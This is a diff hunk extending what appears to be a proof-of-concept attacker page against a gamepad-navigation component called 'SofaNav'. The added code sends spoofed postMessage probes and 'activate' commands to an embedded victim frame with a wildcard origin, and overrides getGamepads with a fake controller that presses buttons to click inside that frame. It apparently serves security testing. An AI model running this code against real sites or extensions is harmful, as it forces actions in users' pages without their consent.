@@ -29,11 +29,29 @@
   frame.onload = () => {
     let n = 0;
     const timer = setInterval(() => {
+      // Probe forms of every transport, pointing replies at an inbox the attacker made up.
+      frame.contentWindow.postMessage({ sofanavProbe: 'attacker-' + n, reply: 'sofanav.inbox.attacker' }, '*');
       frame.contentWindow.postMessage({ sofanav: PROTO, type: 'snapshot', req: ++n, vpArea: innerWidth * innerHeight }, '*');
       for (let id = 1; id <= 50; id++) frame.contentWindow.postMessage({ sofanav: PROTO, type: 'activate', id }, '*');
       if (n > 10) clearInterval(timer);
     }, 200);
   };
+
+  // Fake a controller for whatever SofaNav runs in this (top) page: if it can see this
+  // getGamepads, it would move into the victim frame and press A there for real.
+  const buttons = Array.from({ length: 17 }, () => ({ pressed: false, touched: false, value: 0 }));
+  const pad = { id: 'fake pad', index: 0, connected: true, mapping: 'standard', axes: [0, 0, 0, 0], buttons, timestamp: 0 };
+  Navigator.prototype.getGamepads = function () { return [pad, null, null, null]; };
+  const steps = [15, 13, 0]; // right, down, A; each pressed then released
+  let step = 0;
+  setInterval(() => {
+    const b = steps[Math.floor(step / 2) % steps.length], down = step % 2 === 0;
+    buttons[b] = { pressed: down, touched: down, value: down ? 1 : 0 };
+    pad.timestamp = performance.now();
+    step++;
+  }, 120);
+  dispatchEvent(new Event('gamepadconnected'));
+  setTimeout(() => dispatchEvent(new Event('gamepadconnected')), 1500); // after a late-loading SofaNav
 </script>
 </body>
 </html>
